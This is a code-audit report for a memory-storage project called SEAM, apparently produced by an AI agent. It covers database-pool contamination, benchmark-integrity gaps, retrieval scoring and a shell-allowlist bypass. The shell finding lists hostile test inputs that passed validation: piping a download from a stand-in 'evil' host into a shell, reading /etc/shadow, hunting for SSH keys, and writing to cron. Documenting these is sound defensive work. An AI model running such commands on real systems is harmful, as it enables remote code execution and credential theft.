# SEAM Deep Health Audit — 2026-05-28

Read-only audit. No repo state changed. Three parallel subsystem deep-dives
(persistence, server/security, benchmark integrity) plus direct re-verification
of the prior `2026-05-28-locomo-retrieval-memory.md` findings. Every row below was
confirmed against current working-tree code; the headline Critical was reproduced
with a runnable PoC.

Branch at audit time: `audit/locomo-retrieval-bundle-270`. Local venv has all
optional deps installed (uvicorn, textual, fastapi, psycopg, sentence-transformers,
anthropic, openai, chromadb), so the local suite exercises server + dashboard paths.

**Test baseline (verified, no skips):** `888 passed, 0 failed, 0 errored`. A plain
`pytest` run skips 3 pgvector real-adapter tests (`tests/audit/test_pgvector_pk_composite.py`,
gated on `PGVECTOR_TEST_DSN`). Those 3 were run to completion against an ephemeral
docker-compose `seam-pgvector` container (DSN exported) → **3 passed in 0.36s**;
container removed and port 55432 released afterward per the runtime-service-safety
policy. Note: PROJECT_STATUS's "653 passed / 0 skipped" is environment-conditional —
"0 skipped" only holds when docker pgvector is up with the DSN set; the bare suite
shows 3 skips. Also: `pytest --timeout=N` errors out (pytest-timeout not installed)
while the wrapping shell can still report exit 0 — verify the pass/skip line, not the
exit code.

---

## 1. Findings (by severity)

| ID | Severity | File:line | Problem | Verification |
|----|----------|-----------|---------|--------------|
| **P1** | **Critical** | `pool.py:96-106` + every multi-statement write in `storage.py` | Pooled connection uses default `isolation_level=""` (implicit txns). A write that raises after the first `execute` but before `commit()` is returned to the pool with **no `rollback()`**; the next caller's `commit()` persists the orphaned rows. Corrupts the "canonical source of truth," incl. append-only audit tables. | **Reproduced.** PoC: Caller A inserts row 1 then hits a NOT NULL error before commit; Caller B reuses the connection and commits a legit row; final DB = `[(1,'phantom_from_A'),(3,'legit_from_B')]` → `CONTAMINATED!`. `grep` confirms **zero** `rollback()` in storage.py/pool.py. |
| **B2** | **High** | `benchmark_integrity.py:219-358` | `validate_publication_readiness` — the only function enforcing the non-stub-judge + BIL-2 rule that the SOPs call the publication gate — is wired into **no CLI command and no CI step**. Dead code. Nothing forces a result through it before a number is reported. | `grep` outside tests/def returns only a docstring mention in `tools/h2/backfill_bundle.py`. CLI exposes `bench seal/verify/inspect` only (`cli.py:787-820`); none call it. `docs/SOP_TRACK_M_P1:81-82` *documents* it as the gate. |
| **B3** | **High** | `benchmark_integrity.py:151-216` | BIL `verify_benchmark_bundle` recomputes `result_hash(result)` and compares it to `bil.result_hash` read from **the same bundle**. No signature, no external/git anchor. Detects accidental corruption only — a deliberate edit recomputes the hash and rewrites the field. Integrity ≠ tamper-evidence. | `verify` reads both `actual` and `expected` from the one `bundle` arg (151-178). No key material in the module. (Internal SEAM-BENCH path *does* have git-committed baseline anchoring via `benchmark_baseline_policy.py`; the external/LoCoMo publication path that backs headline numbers does not.) |
| **S1** | **High** (Critical if `SEAM_DASHBOARD_ALLOW_SHELL=1`) | `dashboard.py:1420` + `1440-1441` | Shell allowlist validates only `shlex.split(command)[0]`, then hands the **raw command string** to `[shell, "-lc", command]`. Any shell operator chains arbitrary commands and escapes `_validate_shell_cwd`. | Sub-agent ran `_validate_shell_command` directly: `ls && curl http://evil\|sh`, `echo $(cat /etc/shadow)`, `find / -name id_rsa`, `echo hi > /etc/cron.d/x` all PASS. Gated off by default; Critical the moment the flag is set or an agent is wired to that input. |
| **R1** | **High** | `retrieval.py:34-36, 48` | Retrieval fusion is structurally weak: (P0-1) semantic channel falls back to a bag-of-words cosine over the *same tokens* as lexical when `vector_scores={}` → ~75% effective lexical weight; (P0-2) BM25 fires only on RAW records (`kind==RAW and id in bm25_scores`); fixed weights `0.4 lex + 0.35 sem + 0.15 graph + 0.10 temporal` with no normalization. | Confirmed at current lines by persistence sub-agent. Directly caps LoCoMo `context_recall` (Track M) — RRF across channels is the documented fix. |
| **R2** | **High** | `temporal.py:8-16, 54-66` + `adapters/seam.py:345-370` | The `0.10*temporal` retrieval channel is **dead on real LoCoMo**. `parse_temporal_reference` IS called per question but returns `None`: `detect_temporal_tokens` regex matches only explicit date literals, not LoCoMo phrasings ("how long ago", "when did X happen", "before/after Y"); `parse_iso` only accepts ISO-dash dates. Quickstart's `2023-04-12 09:14` timestamps parse, so the smoke test masks it. | Confirms prior-doc P0-3 and **corrects** the "never called" reading — it's called, returns None. |
| **F2** | **High** | `retry.py` (whole file) | `retry_db_operation`/`retry_network_operation` is **dead code** — imported only by `tests/audit/test_retry.py`, never by storage/pool/runtime. No write path handles `OperationalError("database is locked")`; sole mitigation is `pragma busy_timeout=5000`. Under concurrent writers, lock errors surface to callers. | `grep` repo-wide: only import site is the test. **Corrects prior-doc P2-7**, which claimed 4 duplicated retry blocks to consolidate — there are **zero**; the bug is the opposite. |
| **B4** | **Medium** | `benchmark_integrity.py:121` + `.github/workflows/ci.yml:169-172` | BIL-2 (top integrity level) is stampable on stub-judge output via `--allow-stub-seal`; CI seals a stub LoCoMo run as BIL-2 and uploads it. **Documented as intentional smoke** (REPO_LEDGER:70-80) and the `judge=stub` metadata is recorded, so this is a weakened trust signal, not a false public claim — no doc cites the CI artifact as a quality claim. Severity rises if that ever changes. | `seal_benchmark_bundle` skips the stub check when `allow_stub_seal=True`. ci.yml:169 `--judge stub`; 172 `--allow-stub-seal`. |
| **S2** | **Medium** | `server.py:539-547, 679-680` | Graceful-shutdown machinery (HISTORY#268: `ShutdownState.trigger_shutdown`, `wait_drain`, `_cleanup_runtime`, `_shutdown_timeout_from_env`) has **no production caller**. `create_app_from_env` never threads in `shutdown_state`; `run_server` holds no reference. On SIGTERM there is no connection drain and no store/vector cleanup. | `grep` outside `test_shutdown.py` returns only the definitions. Confirms prior-doc P1-3/P1-4 (dead code) and the *substance* of P0-4 (no `trigger_shutdown` ever runs). **Corrects P0-4's mechanism**: the signal handler doesn't "override uvicorn" — uvicorn re-installs its own handlers in the single-worker path; the SEAM handler is simply unreachable for drain. |
| **F3** | **Medium** | `pool.py:58-82` | `_validate_connection` (`select 1`) runs **inside the global lock**, so one slow/hung validation serializes all checkouts and defeats pooling. | Fast-path loop + validation entirely within `with self._lock`. Confirms prior-doc P2-2. |
| **F4** | **Medium** | `pool.py:84-92` | Blocking exhaustion path (`get(timeout=...)`) returns the connection with **no validation and no idle check** — can hand out a dead/expired connection precisely under load. | Lines 86-87 assign `conn` directly; validation/idle logic exists only in the fast path. Confirms prior-doc P2-1. |
| **F5** | **Medium** | `storage.py:311` vs `pack.py:59`, `nl.py:26/98` | Orphan-edge sweep prefix tuple `("clm:","rel:","sym:","raw:","sta:","evt:")` omits `span:` and `pack:`. Both kinds carry prov/evidence, so `_persist_edges` can create edges keyed by a `span:`/`pack:` id that the sweep never reaps → slow edge-table growth + stale graph neighbors. | PACK id `pack:…`, SPAN id `span:…`; neither prefix in the tuple. |
| **B5** | **Medium** | `run.py:71-78` vs `audit.py:88-96` | Two divergent `fixture_hash` definitions: `run.py` hashes `{case_id,question,gold_answer,category}`; `audit.py` hashes `{id,q}` while its docstring **falsely** claims it matches run.py. Cross-tool fixture-integrity checking is silently broken. | Field sets differ at cited lines; the equality the docstring asserts is impossible. |
| **B6** | **Medium** | `benchmarks.py:204-232,1811` + `runner.py:362-435` | Determinism gaps: `bundle_hash` mixes in `created_at`/`run_id`/`db_path`/`platform` (per-run-unique → not reproducible); raw unrounded floats (`cr`,`em`,`f1`) hashed into BIL `result` → cross-machine float drift breaks reproducibility. No seeds anywhere (`manual_seed`/`random.seed`/`PYTHONHASHSEED` absent) so any retrieval-exercising run is not bit-reproducible. | `_hash_payload` strips only the hash key; runner stores unrounded floats; grep found no seeds. |
| **P0-2b/R3** | **Medium** | `retrieval.py:25-55` + `adapters/seam.py:47,65` + `run.py:245-249` | Cross-encoder reranker is **off by default** (`rerank=None`); and the single candidate pool ranks ENT/CLM/STA/EVT/REL **and** RAW against one `limit=search_top_k=20`, so extra records displace RAW (HISTORY#240 failure mode, partially recovered via evidence/prov closure). | Confirms prior-doc P1-2 and P0-2. Default reranker-on is the documented cat-3 (multi-hop) lift. |
| **F6** | **Low** | `storage.py:672-684` | When `ids` AND `limit` are passed together, SQL `LIMIT` applies in id-order before the Python caller-order reindex, so the limited subset may not match requested order. ID-only path is correct. | load_ir adds `order by id limit ? offset ?` then reorders by `ids` in Python; truncation happens first. |
| **F7** | **Low** | `storage.py:53-57` | `pragma synchronous` never set (stays default FULL — durable, but not explicitly pinned). | `_connect` sets WAL + busy_timeout + foreign_keys only. |

### Confirmed clean (verified, no action)
- Bearer auth uses `hmac.compare_digest` (timing-safe); `/health` intentionally unauthenticated + rate-limited; all state-changing endpoints carry the guard (`server.py:271-287`).
- Body-size limit is ASGI middleware running **before** handlers, enforces a running byte count → chunked/streaming can't bypass (`server.py:194-236`).
- Remote-bind guard classifies `0.0.0.0` as remote; not bypassable via casing/brackets (`server.py:565-580`).
- Rate limiter bounded by `max_keys` with oldest-key eviction; `workers>1` refused under process-local limiting (`server.py:119-148`).
- `vector_adapters` table name validated against `^[A-Za-z_][A-Za-z0-9_]*$` on every op; all values parameterized (`vector_adapters.py:215-220`). No SQL injection.
- MCP surface rejects raw paths: `hs:` ref regex + `relative_to(allowed_root)` containment, all ints bounded (`mcp.py:393-427`).
- HISTORY#268 storage revert/re-apply is **clean** — no merge-corruption residue; retrieval-event and improvement-proposal methods are each single coherent definitions.

---

## 2. Prior-audit corrections (highest "going unnoticed" value)

The `2026-05-28-locomo-retrieval-memory.md` doc is mostly accurate, but two items
are wrong and following them would do harm:

1. **P2-7 is false.** It says "4 copies of the same `for attempt in range(3)` retry
   block — consolidate into `@retry_db_operation`." There are **zero** such blocks
   in storage.py. The real bug (F2) is the opposite: `retry.py` already exists and
   is wired to **nothing**. Don't consolidate phantom code — wire the existing
   decorator into the write paths.
2. **P0-4's mechanism is wrong.** It says the custom `signal_handler` "overrides
   uvicorn's graceful handlers." In the single-worker path uvicorn re-installs its
   own SIGTERM/SIGINT handlers after `run_server` registers the custom one, so the
   SEAM handler is **unreachable**, not overriding. The real defect (S2) is that the
   whole drain machinery has no caller. Fix = wire `ShutdownState`/`_cleanup_runtime`
   into the lifespan shutdown hook, not "remove the signal handler."

---

## 3. Coverage boundary (audited vs not)

**Audited this pass:** persistence (storage/pool/retry/retrieval/reconcile),
server + security surfaces (server/dashboard-shell/mcp/vector_adapters), benchmark
integrity (benchmark_integrity/baseline_policy/external + LoCoMo adapter/run/audit).

**NOT audited this pass:** the **lossless / SEAM-HS/1 round-trip** (the product's
differentiator — "lossless requires exact reconstruction"; un-verified here), the
1836-line `cli.py`, history/streams tooling internals, and ~90% of `dashboard.py`
beyond the shell path. The lossless round-trip is the single highest-value
uncovered area given the "rival the best memory frameworks" goal.

---

## 4. Recommended order of operations (no calendar framing)

1. **P1 — fix connection contamination first.** Add `rollback()` (or close-and-discard)
   in `pool.checkout()`'s except/finally before returning a connection to the pool.
   This is a data-integrity Critical for a source-of-truth store and is ~5 lines.
   Keep the PoC as a regression test.
2. **B2 + B3 — close the benchmark-integrity gap.** Wire `validate_publication_readiness`
   into a real `seam bench publish`/gate command so the documented publication rule
   actually runs; add an external anchor (sign or git-commit the result hash) so
   `verify` is tamper-evident, not self-referential. This is what makes "auditable
   benchmarks" a true claim vs a documented intention.
3. **R1 + R2 — the Track-M lever.** Switch the 4-channel weighted sum to RRF (k≈60),
   make semantic return 0.0 (not lexical) when no vectors, index all record kinds in
   BM25, default the cross-encoder reranker on when sentence-transformers is present,
   and broaden temporal phrasings. These are the changes that move LoCoMo
   `context_recall` — the thing you're working on now. Validate on the dev partition
   only (`tools/h2/holdout_split.py`); reserve holdout for publish-time.
4. **S1 — shell safety.** Execute the validated `argv` list directly (shell-free), or
   reject any command whose `shlex.split` contains shell operators, before anyone
   wires an agent to that input or flips `SEAM_DASHBOARD_ALLOW_SHELL=1`.
5. **F2 / S2 / F3 / F4 — wire the dead machinery.** Retry decorator into writes;
   ShutdownState into the lifespan hook; validate connections outside the lock and on
   the blocking path. Mechanical, removes latent production-correctness debt.

## 4b. Implemented in this session (verified)

- **P1 (Critical) — FIXED.** `pool.py` now resets connections on return
  (`rollback()` + discard-on-error) so a half-written transaction can't ride
  the next caller's commit. Regression: `tests/audit/test_pool_rollback.py`.
- **B2 + B3 — FIXED.** `seam bench publish` now runs the previously-dead
  `validate_publication_readiness` gate (non-stub judge + BIL-2 verify, exit 1
  if blocked). Bundles are now tamper-evident via an optional HMAC anchor
  (`SEAM_BENCHMARK_SIGNING_KEY`): editing a sealed result fails verification
  even if the SHA is recomputed; unsigned bundles stay backward-compatible and
  now report `signed: false`. Regression: `tests/audit/test_benchmark_signing_publish.py`.
- **Durable benchmark results — FIXED (operator priority).** LoCoMo runs now
  always write a verified durable bundle to `benchmarks/runs/locomo/`
  (override `SEAM_BENCH_RESULTS_DIR`), never only to /tmp. Writes are atomic
  (temp + fsync + `os.replace` + dir fsync) and read-back verified. The grouped
  runner checkpoints a `<stem>.partial.json` after every conversation, so an
  interrupted multi-hour run keeps everything up to the last completed scope.
  `--output` into /tmp now warns. Regression: `tests/audit/test_locomo_result_durability.py`.
  Known gap: the parallel path (`--workers > 1`) does not yet checkpoint; the
  sequential path (the no-paid limit-100 long run) does.
- **#3 (R1/R2/R3 retrieval scoring) — DEFERRED, not landed.** The `locomo10.json`
  dataset and `~/seam_benchmarks/` are not on disk, so the 0.528 dev-slice
  baseline can't be reproduced. Changing fusion blind is the exact regression
  trap the audit warns about (HISTORY#240: 0.495→0.461). Land behind a default-off
  flag and flip only after a measured dev-slice run once the dataset is restored.

## 5. Things to watch
- **CI `--timeout` trap:** `pytest --timeout=600` errors out ("unrecognized argument";
  pytest-timeout not installed) yet the wrapping shell can report **exit 0** — a
  green that ran nothing. Verify the suite's real pass/skip line, never the exit code.
- **Stub-as-BIL-2 (B4):** fine as smoke today, but the instant any doc/README cites a
  CI BIL-2 artifact as a quality claim it becomes a false statement.
- **Float/seed determinism (B6):** any reproducibility claim on retrieval-exercising
  runs is currently unsubstantiated.
